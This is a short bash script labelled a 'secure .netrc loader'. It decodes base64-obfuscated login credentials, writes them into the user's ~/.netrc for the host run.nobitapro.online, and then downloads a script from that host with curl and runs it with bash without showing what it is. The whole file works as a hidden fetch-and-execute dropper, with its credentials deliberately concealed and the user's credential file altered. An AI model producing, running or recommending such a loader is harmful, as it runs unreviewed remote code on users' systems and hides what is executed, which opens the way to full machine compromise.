#!/usr/bin/env bash
# Secure .netrc loader → curl --netrc → execute remote script
set -euo pipefail

URL='https://run.nobitapro.online'
HOST='run.nobitapro.online'
NETRC="$HOME/.netrc"

# ---------- REQUIREMENTS ----------
if ! command -v curl >/dev/null 2>&1; then
  echo 'Error: curl is required but not installed.' >&2
  exit 1
fi

if ! command -v base64 >/dev/null 2>&1; then
  echo 'Error: base64 is required but not installed.' >&2
  exit 1
fi

# ---------- HIDDEN CREDENTIALS (BASE64) ----------
LOGIN_B64='dXNlci10eTN0d1RzZ0BJYzJteW1Ja2UoRVJhNHFnTnVkSHAjK3YhTUVFblRwSWR5OGh5VkFLMnVEQENKKEVNdCZIY0U='
PASS_B64='cGR4bmZqYVVGTEg5ajJUdy pQeXleZlpxeFJN KipqcmFyXkxGYUBS JVooXipLYVVuY2VEdmpTQyR3JCRVczNtSmNA'

LOGIN="$(printf '%s' "$LOGIN_B64" | base64 -d)"
PASSWORD="$(printf '%s' "$PASS_B64" | base64 -d)"

# ---------- PREPARE NETRC ----------
touch "$NETRC"
chmod 600 "$NETRC"

tmpfile="$(mktemp)"
grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
mv "$tmpfile" "$NETRC"

{
  printf 'machine %s ' "$HOST"
  printf 'login %s ' "$LOGIN"
  printf 'password %s\n' "$PASSWORD"
} >> "$NETRC"

# ---------- DOWNLOAD & EXECUTE ----------
script_file="$(mktemp)"
cleanup() {
  rm -f "$script_file"
}
trap cleanup EXIT

if curl -fsS --netrc -o "$script_file" "$URL"; then
  bash "$script_file"
else
  echo 'Authentication or download failed.' >&2
  exit 1
fi
